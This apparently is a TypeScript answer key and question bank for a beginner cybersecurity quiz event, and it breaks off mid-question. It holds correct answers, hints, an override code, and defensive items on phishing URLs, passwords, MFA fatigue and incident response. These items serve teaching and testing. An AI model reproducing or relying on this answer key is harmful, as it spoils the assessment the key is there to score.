// PRIVATE ORGANIZER ANSWER KEY & SCORING TAXONOMY
// NEVER EXPOSED TO PARTICIPANT API ENDPOINTS OR PUBLIC CLIENT CODE

export interface AnswerKeyLevel {
  level: number;
  title: string;
  maxScore: number;
  primaryAnswer: string;
  acceptableVariants: string[];
  tokenAwarded: string;
  explanation: string;
  scoringCriteria: string;
  hints: {
    number: number;
    text: string;
    penalty: number;
  }[];
}

export interface QuestionBankItem {
  id: string;
  room: 'alpha' | 'bravo' | 'charlie' | 'delta';
  roomName: string;
  topic: string;
  difficulty: 'BEGINNER' | 'INTERMEDIATE';
  points: number;
  format: 'MULTIPLE_CHOICE' | 'SELECT_ALL' | 'SHORT_ANSWER' | 'SCENARIO' | 'INVESTIGATION';
  scenario: string;
  question: string;
  options?: { id: string; label: string; text: string }[];
  primaryAnswer: string | string[];
  acceptableVariants: string[];
  explanation: string;
  hint: {
    text: string;
    penalty: number;
  };
  successMessage: string;
  retryMessage: string;
}

export interface PrivateAnswerKey {
  event: {
    name: string;
    date: string;
    venue: string;
    durationMinutes: number;
    difficulty: string;
    maxBaseScore: number;
    maxBonusScore: number;
    maxTotalScore: number;
    maxChallengeScore: number;
  };
  levels: {
    1: AnswerKeyLevel;
    2: AnswerKeyLevel;
    3: AnswerKeyLevel;
    4: AnswerKeyLevel;
  };
  masterOverride: {
    code: string;
    acceptableVariants: string[];
    explanation: string;
  };
  bonusPuzzle: {
    title: string;
    ciphertext: string;
    cipherType: string;
    rule: string;
    primaryAnswer: string;
    acceptableVariants: string[];
    points: number;
    explanation: string;
  };
  questionBank: QuestionBankItem[];
}

export const PRIVATE_ANSWER_KEY: PrivateAnswerKey = {
  event: {
    name: 'OPERATION SHADOWBYTE',
    date: '30 October 2026',
    venue: 'Lab R201D',
    durationMinutes: 60,
    difficulty: 'Mixed (Beginner to Intermediate)',
    maxBaseScore: 32,
    maxBonusScore: 3,
    maxChallengeScore: 180,
    maxTotalScore: 215,
  },
  levels: {
    1: {
      level: 1,
      title: 'Packet Sniffer: Binary Payload Decode',
      maxScore: 10,
      primaryAnswer: 'SAFE',
      acceptableVariants: ['SAFE', 'safe', 'Safe', 'S A F E', '01010011 01000001 01000110 01000101'],
      tokenAwarded: 'SAFE',
      explanation: 'Binary sequence 01010011 01000001 01000110 01000101 splits into four 8-bit octets: 01010011 = 83 (\'S\'), 01000001 = 65 (\'A\'), 01000110 = 70 (\'F\'), 01000101 = 69 (\'E\'). Result: "SAFE".',
      scoringCriteria: '10 points for exact match on decoded word (case-insensitive). Deduct 2 points per hint requested (minimum 0).',
      hints: [
        {
          number: 1,
          text: 'Split the continuous 32-bit stream into four 8-bit octets: 01010011 | 01000001 | 01000110 | 01000101. Each octet maps to one ASCII character.',
          penalty: 2,
        },
        {
          number: 2,
          text: 'Place values are 128, 64, 32, 16, 8, 4, 2, 1. Octet 01010011 is 64 + 16 + 2 + 1 = 83, which corresponds to uppercase "S".',
          penalty: 2,
        },
      ],
    },
    2: {
      level: 2,
      title: 'Phishing Vector Triage & Analysis',
      maxScore: 6,
      primaryAnswer: 'A',
      acceptableVariants: ['A', 'a', 'EMAIL A', 'Email A'],
      tokenAwarded: 'URGENCY',
      explanation: 'Email A is a targeted spear-phishing email. It employs an artificial 15-minute countdown threat (urgency), an unfamiliar spoofed lookalike domain (klu-security-portal-auth.com instead of official kluniversity.in), and demands immediate credential input.',
      scoringCriteria: '6 points for identifying Email A and selecting at least 2 key warning indicators (urgency, unfamiliar domain, credential request). Deduct 2 points per hint.',
      hints: [
        {
          number: 1,
          text: 'Inspect the sender domain of each email. Does "admin-verification@klu-security-portal-auth.com" match the authentic domain "kluniversity.in"?',
          penalty: 2,
        },
        {
          number: 2,
          text: 'Phishing attacks exploit psychological pressure: notice which email uses severe artificial urgency (15-minute suspension) to coerce password submissions.',
          penalty: 2,
        },
      ],
    },
    3: {
      level: 3,
      title: 'SIEM Incident Forensics & Log Correlation',
      maxScore: 8,
      primaryAnswer: 'ARUN',
      acceptableVariants: ['ARUN', 'arun', 'Arun'],
      tokenAwarded: 'ARUN',
      explanation: 'User account ARUN suffered 4 consecutive failed logins within 28 seconds originating from foreign proxy IP 185.220.101.42, followed immediately by a successful session token creation (credential stuffing / brute-force takeover). Safe next step: verify the activity with the account owner and investigate relevant logs using authorized procedures.',
      scoringCriteria: '8 points for identifying account ARUN, the brute-force pattern reason, and selecting the safe remediation protocol. Deduct 2 points per hint.',
      hints: [
        {
          number: 1,
          text: 'Filter logs for multiple consecutive "FAILED" login attempts originating from the same foreign IP address (185.220.101.42).',
          penalty: 2,
        },
        {
          number: 2,
          text: 'Look for a 4-letter user beginning with "A" whose password failed 4 times in 28 seconds before succeeding from an unknown external device.',
          penalty: 2,
        },
      ],
    },
    4: {
      level: 4,
      title: 'Identity Defense Architecture',
      maxScore: 8,
      primaryAnswer: 'MFA',
      acceptableVariants: [
        'MFA',
        '2FA',
        'MULTI-FACTOR AUTHENTICATION',
        'MULTI FACTOR AUTHENTICATION',
        'MULTIFACTOR AUTHENTICATION',
        'MULTIFACTOR',
        'TWO-FACTOR AUTHENTICATION',
        'TWO FACTOR AUTHENTICATION',
      ],
      tokenAwarded: 'MFA',
      explanation: 'Multi-Factor Authentication (MFA) requires two or more distinct verification categories: Knowledge (something you know, like a password) combined with Possession (something you have, like a hardware key, authenticator app, or token). This prevents takeover even when credentials are stolen.',
      scoringCriteria: '8 points for identifying MFA or acceptable variants. Deduct 2 points per hint.',
      hints: [
        {
          number: 1,
          text: 'Think about an authentication method that requires two or more distinct verification factors before granting access.',
          penalty: 2,
        },
        {
          number: 2,
          text: 'Commonly abbreviated as a 3-letter acronym: M _ _ (Multi-Factor...).',
          penalty: 2,
        },
      ],
    },
  },
  masterOverride: {
    code: 'SAFE-URGENCY-ARUN-MFA',
    acceptableVariants: [
      'SAFE-URGENCY-ARUN-MFA',
      'safe-urgency-arun-mfa',
      'SAFE URGENCY ARUN MFA',
      'SAFEURGENCYARUNMFA',
    ],
    explanation: 'Assembled concatenation of all four tokens earned across Levels 1 through 4: SAFE (L1) + URGENCY (L2) + ARUN (L3) + MFA (L4). Entering this disarms the rogue ShadowByte failsafe.',
  },
  bonusPuzzle: {
    title: 'Caesar Cipher Cryptanalysis Bonus',
    ciphertext: 'FUBSWR',
    cipherType: 'Caesar Shift Cipher (Shift +3)',
    rule: 'Shift each letter three positions backward in the alphabet: F(-3)=C, U(-3)=R, B(-3)=Y, S(-3)=P, W(-3)=T, R(-3)=O.',
    primaryAnswer: 'CRYPTO',
    acceptableVariants: ['CRYPTO', 'crypto', 'Crypto', 'SHADOW', 'shadow'],
    points: 3,
    explanation: 'Decrypting "FUBSWR" with an inverse shift of 3 yields "CRYPTO". Gives +3 bonus points without hint deductions.',
  },
  questionBank: [
    // -------------------------------------------------------------------------
    // ROOM ALPHA: SOCIAL ENGINEERING AND PHISHING (6 Questions)
    // -------------------------------------------------------------------------
    {
      id: 'Q_PHISH_01',
      room: 'alpha',
      roomName: 'Social Engineering & Phishing',
      topic: 'Phishing Email Identification',
      difficulty: 'BEGINNER',
      points: 5,
      format: 'MULTIPLE_CHOICE',
      scenario: 'A ForensiXplore student receives an urgent email claiming to be from "KL University Library Management" stating: "Overdue book fee noticed. Pay Rs 150 immediately at http://kluniv-library-fees.top or your hall ticket will be withheld for the semester exams starting tomorrow."',
      question: 'Which combination of indicators conclusively confirms this communication is a malicious phishing campaign rather than a legitimate university notification?',
      options: [
        { id: 'A', label: 'A', text: 'The fine amount is small (Rs 150) and books are physical media.' },
        { id: 'B', label: 'B', text: 'High-stakes artificial urgency (hall ticket withheld), non-standard external TLD (.top), and payment collection outside the official university portal.' },
        { id: 'C', label: 'C', text: 'The email was sent during semester examinations week.' },
        { id: 'D', label: 'D', text: 'The message contains plain ASCII text without graphical banner images.' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B'],
      explanation: 'Phishing campaigns systematically exploit artificial psychological urgency (threatening exam hall ticket cancellation within 24 hours) combined with deceptive lookalike domains (.top instead of the official kluniversity.in domain) and unauthorized payment collection.',
      hint: {
        text: 'Evaluate how psychological pressure is applied to force rash decisions, and verify the domain name extension (.top vs official university domains).',
        penalty: 1
      },
      successMessage: 'THREAT VECTOR CONFIRMED: Phishing markers successfully isolated.',
      retryMessage: 'INCORRECT EVALUATION: Look closely at the urgency threat and the destination web address.'
    },
    {
      id: 'Q_URL_02',
      room: 'alpha',
      roomName: 'Social Engineering & Phishing',
      topic: 'Suspicious URL Analysis',
      difficulty: 'INTERMEDIATE',
      points: 10,
      format: 'SELECT_ALL',
      scenario: 'A SOC analyst is inspecting hyperlinks submitted by internal users for forensic triage. The analyst must flag all URLs displaying deceptive techniques such as typosquatting, unvalidated open redirects, or lookalike subdomains.',
      question: 'Select ALL links from the list below that represent deceptive security risks (Select all that apply):',
      options: [
        { id: 'L1', label: 'Link 1', text: 'https://login.microsoftonline.com.attacker-controlled.net/oauth2/authorize' },
        { id: 'L2', label: 'Link 2', text: 'https://www.kluniversity.in/academics/syllabus.pdf' },
        { id: 'L3', label: 'Link 3', text: 'https://portal.bank.com/redirect?url=http://malicious-harvest.org/steal' },
        { id: 'L4', label: 'Link 4', text: 'https://paypaI.com/account/security-verify (Notice capital "I" substituting lowercase "l")' }
      ],
      primaryAnswer: ['L1', 'L3', 'L4'],
      acceptableVariants: ['L1,L3,L4', 'L1, L3, L4', '1,3,4'],
      explanation: 'L1 uses deceptive subdomains (attacker-controlled.net is the registered root domain), L3 has an unvalidated open redirect vulnerability, and L4 uses homoglyph typosquatting (capital I for l). L2 is a legitimate university resource.',
      hint: {
        text: 'Three of the four links exhibit known attack mechanisms: sub-domain spoofing, open redirect query parameters, and typosquatting.',
        penalty: 2
      },
      successMessage: 'URL INSPECTION COMPLETE: Deceptive links quarantined successfully.',
      retryMessage: 'ANALYSIS INCOMPLETE: Verify the root domain of each URL, look for open redirects, and check character glyphs.'
    },
    {
      id: 'Q_SOCENG_03',
      room: 'alpha',
      roomName: 'Social Engineering & Phishing',
      topic: 'Impersonation and Urgency Tactics',
      difficulty: 'BEGINNER',
      points: 5,
      format: 'MULTIPLE_CHOICE',
      scenario: 'An unknown caller phones the Lab R201D network administrator, claiming to be "Chief Security Officer Dr. Rajesh from Head Office." The caller is aggressive, airport background noise is audible, and they demand the core router root SSH password immediately to remediate a "campus-wide firewall failure before the Vice-Chancellor notices."',
      question: 'What psychological manipulation principles is the attacker exploiting, and what is the proper defense protocol?',
      options: [
        { id: 'A', label: 'A', text: 'Quid pro quo; the administrator should negotiate reciprocal VPN credentials before sharing the password.' },
        { id: 'B', label: 'B', text: 'Authority, intimidation, and manufactured urgency; the administrator must refuse password disclosure and independently verify identity via official out-of-band channels.' },
        { id: 'C', label: 'C', text: 'Shoulder surfing; the administrator should lock the desktop monitor immediately.' },
        { id: 'D', label: 'D', text: 'Dumpster diving; the administrator should immediately shred paper documentation in the lab.' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B'],
      explanation: 'Social engineering frequently exploits fear of authority and manufactured crisis to bypass protocol. Legitimate CSOs will never demand production root credentials over an unverified cellular phone call.',
      hint: {
        text: 'The caller uses high executive status and anger to pressure the technician into bypassing security verification protocols.',
        penalty: 1
      },
      successMessage: 'SOCIAL DEFENSE VERIFIED: Social engineering attack thwarted by strict protocol adherence.',
      retryMessage: 'VULNERABILITY EXPOSED: Never surrender root credentials based on caller assertions or anger.'
    },
    {
      id: 'Q_ATTACH_04',
      room: 'alpha',
      roomName: 'Social Engineering & Phishing',
      topic: 'Malicious Attachment Detection',
      difficulty: 'BEGINNER',
      points: 5,
      format: 'MULTIPLE_CHOICE',
      scenario: 'An HR coordinator in the department receives an applicant resume titled: "KL_Candidate_Resume_2026.pdf.exe" (File size: 840 KB, Windows displays a red Adobe Acrobat PDF icon).',
      question: 'What evasion technique is the adversary employing, and what happens when clicked under default Windows settings?',
      options: [
        { id: 'A', label: 'A', text: 'Macro injection; Adobe Reader will prompt the user to enable VBA macros in Excel.' },
        { id: 'B', label: 'B', text: 'Double extension deception; Windows hides known extensions, displaying "KL_Candidate_Resume_2026.pdf", but the OS executes a malicious native binary (.exe).' },
        { id: 'C', label: 'C', text: 'Buffer overflow; the executable will silently convert into an image in memory without executing.' },
        { id: 'D', label: 'D', text: 'Zip bomb; the file will expand to 10 TB on the local hard drive.' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B'],
      explanation: 'Windows hides file extensions for known file types by default. Adversaries exploit this by naming executables with a secondary decoy extension (e.g., .pdf.exe) and embedding an Adobe icon, tricking victims into executing malware.',
      hint: {
        text: 'Inspect the last 4 characters of the full filename. How does the Windows shell treat double extensions when extension hiding is enabled?',
        penalty: 1
      },
      successMessage: 'PAYLOAD UNMASKED: Double-extension execution vector neutralized.',
      retryMessage: 'INCORRECT TRIAGE: Review how Windows interprets the terminal extension of a file.'
    },
    {
      id: 'Q_SPEAR_05',
      room: 'alpha',
      roomName: 'Social Engineering & Phishing',
      topic: 'Spear Phishing Scenarios',
      difficulty: 'INTERMEDIATE',
      points: 10,
      format: 'MULTIPLE_CHOICE',
      scenario: 'A senior professor heading a quantum cryptography lab receives an email addressing her by full title, referencing her exact grant proposal #DST-QC-2026, and citing two of her PhD research scholars. The sender claims to be the DST chief scientific referee requesting review of an attached macro-enabled Word document: "Reviewer_Budget_Revisions_Confidential.docm".',
      question: 'Why is this attack classified as Spear Phishing rather than generic bulk phishing, and why are .docm attachments high-risk?',
      options: [
        { id: 'A', label: 'A', text: 'It is bulk automated spam delivered indiscriminately to thousands of recipients with plain text files.' },
        { id: 'B', label: 'B', text: 'It uses tailored reconnaissance and legitimate context to target a specific high-value researcher; the .docm format executes embedded Visual Basic for Applications (VBA) macro code capable of downloading malware.' },
        { id: 'C', label: 'C', text: 'It only executes on mobile iOS devices and cannot harm Windows or Linux workstations.' },
        { id: 'D', label: 'D', text: 'The .docm extension stands for Document Certificate Model and is automatically authenticated by Microsoft Word.' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B'],
      explanation: 'Spear phishing involves thorough pre-attack reconnaissance to craft highly personalized lures targeting specific individuals. Files ending in .docm contain executable VBA macros that run arbitrary commands upon user activation.',
      hint: {
        text: 'Spear phishing targets specific individuals with tailored reconnaissance. The "m" in .docm designates macro-enabled executable capabilities.',
        penalty: 2
      },
      successMessage: 'SPEAR PHISHING NEUTRALIZED: Tailored reconnaissance vector recognized and macro execution halted.',
      retryMessage: 'INCORRECT TRIAGE: Analyze the customized targeting and the code-execution capabilities of macro-enabled files.'
    },
    {
      id: 'Q_BEC_06',
      room: 'alpha',
      roomName: 'Social Engineering & Phishing',
      topic: 'Business Email Compromise (BEC)',
      difficulty: 'INTERMEDIATE',
      points: 10,
      format: 'MULTIPLE_CHOICE',
      scenario: 'The university finance comptroller receives an email with display name "Vice Chancellor Office <vc-office@kluniversity-management.co.in>". The message requests an emergency expedited wire transfer of Rs 8,50,000 to an offshore vendor account for urgent lab equipment, instructing: "I am in a closed executive meeting and cannot take calls. Wire the funds before 4:00 PM today to guarantee delivery."',
      question: 'What specific cyber fraud vector does this incident describe, and what mandatory verification control prevents financial loss?',
      options: [
        { id: 'A', label: 'A', text: 'DDoS attack; restart the campus core router immediately.' },
        { id: 'B', label: 'B', text: 'Ransomware attack; negotiate the vendor fee using cryptocurrency.' },
        { id: 'C', label: 'C', text: 'Business Email Compromise (BEC) with display name spoofing; enforce secondary out-of-band voice verification and dual-authorization approval before processing wire transfers.' },
        { id: 'D', label: 'D', text: 'Cross-Site Scripting (XSS); disable JavaScript in the comptroller\'s web browser.' }
      ],
      primaryAnswer: 'C',
      acceptableVariants: ['C', 'c', 'OPTION C', 'BEC'],
      explanation: 'Business Email Compromise (BEC) deceives employees into wiring funds to fraudulent accounts through executive impersonation and fake urgency. Mandatory controls include dual authorization and strict out-of-band verification via known phone channels.',
      hint: {
        text: 'Targeted executive impersonation to divert wire transfers is called BEC. Out-of-band verbal confirmation prevents unauthorized transfers.',
        penalty: 2
      },
      successMessage: 'BEC SCHEME DISMANTLED: Executive impersonation detected and out-of-band verification enforced.',
      retryMessage: 'INCORRECT EVALUATION: Look for the specific term describing executive wire transfer fraud (BEC).'
    },

    // -------------------------------------------------------------------------
    // ROOM BRAVO: PASSWORD AND IDENTITY SECURITY (6 Questions)
    // -------------------------------------------------------------------------
    {
      id: 'Q_PWD_STR_07',
      room: 'bravo',
      roomName: 'Password & Identity Security',
      topic: 'Password Strength Analysis',
      difficulty: 'BEGINNER',
      points: 5,
      format: 'MULTIPLE_CHOICE',
      scenario: 'Analyst A chooses the password "P@ssw0rd123!" (11 characters with uppercase, lowercase, numbers, and symbols). Analyst B chooses "correct-horse-battery-staple" (28 characters composed of 4 random dictionary words separated by hyphens).',
      question: 'Which password offers significantly higher mathematical entropy against modern GPU-accelerated hash cracking attacks, and why?',
      options: [
        { id: 'A', label: 'A', text: '"P@ssw0rd123!" because special symbols provide absolute cryptographic immunity.' },
        { id: 'B', label: 'B', text: '"correct-horse-battery-staple" because total length exponentially expands the keyspace search depth far beyond common rule-based dictionary mutations.' },
        { id: 'C', label: 'C', text: 'Both passwords offer identical security because SHA-256 hashes are always 256 bits long.' },
        { id: 'D', label: 'D', text: 'Neither password can be processed safely by modern operating systems.' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B'],
      explanation: 'Mathematical entropy scales exponentially with length ($N^L$). Short passwords using common substitution rules (like "P@ssw0rd") are broken within seconds by dictionary rule engines like hashcat, whereas long multi-word passphrases take millennia to brute force.',
      hint: {
        text: 'Length provides exponentially greater entropy than short passwords with predictable leetspeak substitutions.',
        penalty: 1
      },
      successMessage: 'ENTROPY MASTERY CONFIRMED: Length-driven passphrase architecture recognized.',
      retryMessage: 'INCORRECT ENTROPY EVALUATION: Password length expands search space exponentially compared to predictable character swaps.'
    },
    {
      id: 'Q_PASS_05',
      room: 'bravo',
      roomName: 'Password & Identity Security',
      topic: 'Password Reuse & Credential Stuffing',
      difficulty: 'BEGINNER',
      points: 5,
      format: 'SHORT_ANSWER',
      scenario: 'An analyst used the password "ShadowByte2026!" on both an external gaming forum and the university SOC portal. When the gaming forum database was breached and posted on a dark web forum, threat actors automated login attempts on hundreds of university services using that password, successfully gaining access.',
      question: 'What specific cyber attack methodology succeeded due to this password reuse? (Type the 2-word term)',
      primaryAnswer: 'CREDENTIAL STUFFING',
      acceptableVariants: [
        'CREDENTIAL STUFFING',
        'CREDENTIAL-STUFFING',
        'CREDENTIALSTUFFING',
        'credential stuffing',
        'Credential Stuffing'
      ],
      explanation: 'Credential Stuffing is the automated testing of stolen username/password pairs across multiple unrelated web applications, capitalizing on widespread user credential reuse.',
      hint: {
        text: 'Two-word term: The first word relates to login credentials, and the second word means filling or packing repeatedly (Credential S_______).',
        penalty: 1
      },
      successMessage: 'ATTACK CLASSIFICATION ACCURATE: Credential Stuffing vector identified.',
      retryMessage: 'INCORRECT TERM: Hint: automated re-use of breached credentials across other websites is called "Credential ________".'
    },
    {
      id: 'Q_BRUTE_08',
      room: 'bravo',
      roomName: 'Password & Identity Security',
      topic: 'Brute-Force Attack Detection',
      difficulty: 'BEGINNER',
      points: 5,
      format: 'MULTIPLE_CHOICE',
      scenario: 'A SOC analyst observes an external IP address generating 800 failed SSH login attempts per minute against the campus bastion host, systematically cycling through top-1000 password wordlists.',
      question: 'Which host-based intrusion prevention utility monitors authentication logs and automatically configures firewall rules to ban attacking IP addresses?',
      options: [
        { id: 'A', label: 'A', text: 'Fail2ban (or SSHGuard) log-parsing IP banning daemon' },
        { id: 'B', label: 'B', text: 'Traceroute diagnostic utility' },
        { id: 'C', label: 'C', text: 'Cron job that reboots the server every 10 minutes' },
        { id: 'D', label: 'D', text: 'WHOIS domain registry lookup tool' }
      ],
      primaryAnswer: 'A',
      acceptableVariants: ['A', 'a', 'OPTION A', 'FAIL2BAN'],
      explanation: 'Fail2ban dynamically parses log files (such as `/var/log/auth.log`) for repeated authentication failures and adds temporary firewall drop rules (via iptables or nftables) to ban malicious IP addresses.',
      hint: {
        text: 'Popular open-source intrusion prevention daemon that monitors auth logs and bans IPs (Fail2___).',
        penalty: 1
      },
      successMessage: 'BRUTE-FORCE MITIGATION ACTIVE: Dynamic log-parsing IP ban daemon deployed.',
      retryMessage: 'INCORRECT TOOL: Identify the service specifically designed to ban IPs based on repeated log authentication failures.'
    },
    {
      id: 'Q_REUSE_07',
      room: 'bravo',
      roomName: 'Password & Identity Security',
      topic: 'Secure Password Storage & Salting',
      difficulty: 'INTERMEDIATE',
      points: 10,
      format: 'MULTIPLE_CHOICE',
      scenario: 'An audit of a legacy web database reveals passwords stored as unsalted MD5 hashes: md5("admin123") = 0192023a7bbd73250516f069df18b500. An attacker uses precomputed rainbow tables to reverse 90% of user passwords in seconds.',
      question: 'Which cryptographic hashing design standard is required to defeat rainbow table attacks and slow down offline GPU cracking?',
      options: [
        { id: 'A', label: 'A', text: 'Re-encode passwords in Base64 encoding.' },
        { id: 'B', label: 'B', text: 'Apply a unique cryptographically random salt per user and migrate to a slow, memory-hard key derivation function such as Argon2id or bcrypt.' },
        { id: 'C', label: 'C', text: 'Encrypt passwords using ROT13 with a static shift.' },
        { id: 'D', label: 'D', text: 'Store passwords in a hidden plaintext text file.' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B'],
      explanation: 'Cryptographic salts ensure identical passwords produce distinct hash values, neutralizing precomputed rainbow tables. Slow, memory-hard hash algorithms like Argon2id, bcrypt, and scrypt force heavy compute/memory burdens on GPU cracking rigs.',
      hint: {
        text: 'Rainbow tables are defeated by adding unique random data (salt) to every password before hashing with slow, adaptive algorithms like bcrypt or Argon2id.',
        penalty: 2
      },
      successMessage: 'CRYPTOGRAPHIC DEFENSE RESTORED: Salting and memory-hard KDF standards enforced.',
      retryMessage: 'INCORRECT REMEDIATION: Review how salts eliminate rainbow tables and why memory-hard KDFs impede GPU brute forcing.'
    },
    {
      id: 'Q_MFA_FATIGUE_09',
      room: 'bravo',
      roomName: 'Password & Identity Security',
      topic: 'MFA Fatigue Attacks',
      difficulty: 'INTERMEDIATE',
      points: 10,
      format: 'MULTIPLE_CHOICE',
      scenario: 'At 2:45 AM, an IT systems engineer is awakened by 50 consecutive push approval prompts on their mobile authenticator app. The attacker, having previously compromised the engineer\'s password, calls pretending to be the "KL Helpdesk" stating: "Our servers are experiencing an alert loop. Please tap Approve on your phone to dismiss the alerts."',
      question: 'What is this social-engineering attack technique called, and which MFA configuration fundamentally neutralizes it?',
      options: [
        { id: 'A', label: 'A', text: 'SQL injection; neutralized by enabling database transaction rollbacks.' },
        { id: 'B', label: 'B', text: 'MFA Fatigue (Push Notification Bombing); neutralized by enforcing Number Matching and context-rich authentication prompts.' },
        { id: 'C', label: 'C', text: 'Man-in-the-Middle; neutralized by disabling TLS encryption on mobile devices.' },
        { id: 'D', label: 'D', text: 'Buffer Overflow; neutralized by installing additional RAM on the user\'s phone.' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B'],
      explanation: 'MFA Fatigue (Push Bombing) bombards victims with continuous authentication requests until they tap Approve to end the annoyance. Enforcing Number Matching stops this attack because the user cannot approve without seeing and entering the 2-digit number presented on the login screen.',
      hint: {
        text: 'The attack is called MFA Fatigue / Push Bombing. Number Matching requires typing the code displayed on the login screen.',
        penalty: 2
      },
      successMessage: 'PUSH BOMBING NEUTRALIZED: Number matching and anti-fatigue controls verified.',
      retryMessage: 'INCORRECT IDENTIFICATION: Recognize the pattern of repetitive push alerts (MFA Fatigue) and the Number Matching defense.'
    },
    {
      id: 'Q_MFA_06',
      room: 'bravo',
      roomName: 'Password & Identity Security',
      topic: 'Passkeys & Phishing-Resistant Authentication',
      difficulty: 'INTERMEDIATE',
      points: 10,
      format: 'MULTIPLE_CHOICE',
      scenario: 'The university SOC mandates FIDO2/WebAuthn hardware security keys (e.g. YubiKeys) for all administrative accounts instead of SMS-based or email-based one-time passcodes (OTP).',
      question: 'Why are FIDO2/WebAuthn hardware tokens fundamentally resilient against adversary-in-the-middle (AiTM) reverse-proxy phishing attacks compared to SMS OTPs?',
      options: [
        { id: 'A', label: 'A', text: 'Hardware tokens generate longer OTP codes that change every 10 seconds rather than 30 seconds.' },
        { id: 'B', label: 'B', text: 'FIDO2 binds cryptographic assertions directly to the authenticated origin URL, causing authentication to fail if proxied to an attacker-controlled domain.' },
        { id: 'C', label: 'C', text: 'Hardware keys emit infrared light that prevents screen capture software from recording passwords.' },
        { id: 'D', label: 'D', text: 'FIDO2 requires cellular network coverage to complete authentication handshakes.' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B'],
      explanation: 'FIDO2/WebAuthn public-key authentication creates a cryptographically signed response tied directly to the browser\'s TLS origin domain (origin binding). If an attacker proxies the login to a lookalike domain, the origin mismatch causes validation to fail instantly.',
      hint: {
        text: 'WebAuthn/FIDO2 cryptographically binds the authentication assertion to the exact domain origin shown in the browser address bar.',
        penalty: 2
      },
      successMessage: 'ZERO-TRUST IDENTITY CONFIRMED: Phishing-resistant FIDO2 cryptographic origin binding validated.',
      retryMessage: 'INCORRECT PROTOCOL ANALYSIS: Review how FIDO2 public-key cryptography enforces cryptographic domain binding.'
    },

    // -------------------------------------------------------------------------
    // ROOM CHARLIE: SOC FORENSICS AND INCIDENT RESPONSE (6 Questions)
    // -------------------------------------------------------------------------
    {
      id: 'Q_LOGIN_LOGS_10',
      room: 'charlie',
      roomName: 'SOC Forensics & Incident Response',
      topic: 'Suspicious Login Log Analysis',
      difficulty: 'BEGINNER',
      points: 5,
      format: 'SHORT_ANSWER',
      scenario: 'During a security review of a Windows Active Directory domain controller, the SIEM alerts on a sudden burst of log events with Event ID 4625 ("An account failed to log on") generated 1,800 times in 2 minutes against student accounts, followed by Event ID 4624 (Successful Logon).',
      question: 'What standard 4-digit Windows Event ID specifically logs a failed logon attempt?',
      primaryAnswer: '4625',
      acceptableVariants: ['4625', 'EVENT 4625', 'EVENT ID 4625', 'ID 4625', 'EVENTID 4625'],
      explanation: 'Windows Security Event ID 4625 records failed logon attempts, containing critical forensics such as TargetUserName, WorkstationName, FailureReason, and SourceIpAddress.',
      hint: {
        text: '4 digits: 462_ (The failed logon event immediately preceding successful logon event 4624).',
        penalty: 1
      },
      successMessage: 'AUDIT EVENT CONFIRMED: Event ID 4625 isolated for failed logon correlation.',
      retryMessage: 'INCORRECT EVENT ID: Enter the standard 4-digit Windows security log event ID for failed logon attempts.'
    },
    {
      id: 'Q_LOGS_09',
      room: 'charlie',
      roomName: 'SOC Forensics & Incident Response',
      topic: 'Impossible Travel Detection',
      difficulty: 'INTERMEDIATE',
      points: 10,
      format: 'MULTIPLE_CHOICE',
      scenario: 'SIEM logs show Analyst Priya authenticated successfully from IP 115.240.90.12 (Vijayawada, India) at 14:15:00 UTC. At 14:27:00 UTC (12 minutes later), the same account authenticated successfully from IP 185.191.171.40 (Frankfurt, Germany) without VPN tunnel indicators.',
      question: 'What high-confidence security anomaly does this log sequence prove?',
      options: [
        { id: 'A', label: 'A', text: 'Normal distributed cloud load-balancing across multi-region edge gateways.' },
        { id: 'B', label: 'B', text: 'Impossible Travel / Geovelocity anomaly; human travel across 4,500 miles in 12 minutes is physically impossible, proving credential compromise or proxy hijacking.' },
        { id: 'C', label: 'C', text: 'The user updated their operating system timezone settings.' },
        { id: 'D', label: 'D', text: 'The user connected to university Wi-Fi on a different floor.' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B'],
      explanation: 'Impossible Travel detection computes the speed required to traverse the geographic distance between consecutive logins. 4,500 miles in 12 minutes exceeds Mach 30, proving simultaneous credential usage from distinct geographical locations.',
      hint: {
        text: 'Calculate distance over elapsed time: Vijayawada to Frankfurt in 12 minutes is physically impossible without proxy routing or stolen session tokens.',
        penalty: 2
      },
      successMessage: 'GEOVELOCITY ANOMALY DETECTED: Impossible Travel pattern confirmed.',
      retryMessage: 'INCORRECT ANALYSIS: Look at the timestamps, IP locations, and physical distance traveled.'
    },
    {
      id: 'Q_RANSOM_10',
      room: 'charlie',
      roomName: 'SOC Forensics & Incident Response',
      topic: 'Ransomware Incident Response',
      difficulty: 'BEGINNER',
      points: 5,
      format: 'MULTIPLE_CHOICE',
      scenario: 'Workstations in Lab R201D experience sudden disk thrashing, file extensions change to .shadowlocked, and a ransom note demands cryptocurrency payment. The malware is attempting lateral movement via SMB.',
      question: 'As the first responding cybersecurity analyst, what is the most critical and time-sensitive containment action?',
      options: [
        { id: 'A', label: 'A', text: 'Pay the ransom immediately using the university department credit card.' },
        { id: 'B', label: 'B', text: 'Immediately disconnect infected systems from the local network (unplug Ethernet cables and disable Wi-Fi) to halt lateral spreading.' },
        { id: 'C', label: 'C', text: 'Restart all lab computers into Windows Safe Mode simultaneously.' },
        { id: 'D', label: 'D', text: 'Run a disk defragmentation utility to restore damaged sectors.' }
      ],
      primaryAnswer: 'B',
      acceptableVariants: ['B', 'b', 'OPTION B'],
      explanation: 'In active ransomware incidents, immediate network isolation (severing physical Ethernet and Wi-Fi links) is paramount. This prevents the worm component from encrypting network shares and reaching Domain Controllers.',
      hint: {
        text: 'Containment must occur before eradication or recovery. How do you stop lateral network propagation immediately?',
        penalty: 1
      },
      successMessage: 'LATERAL MOVEMENT CONTAINED: Network quarantine successfully stopped propagation.',
      retryMessage: 'INCORRECT FIRST ACTION: You must isolate the infected systems from the network first before any other action.'
    },
    {
      id: 'Q_IR_11',
      room: 'charlie',
      roomName: 'SOC Forensics & Incident Response',
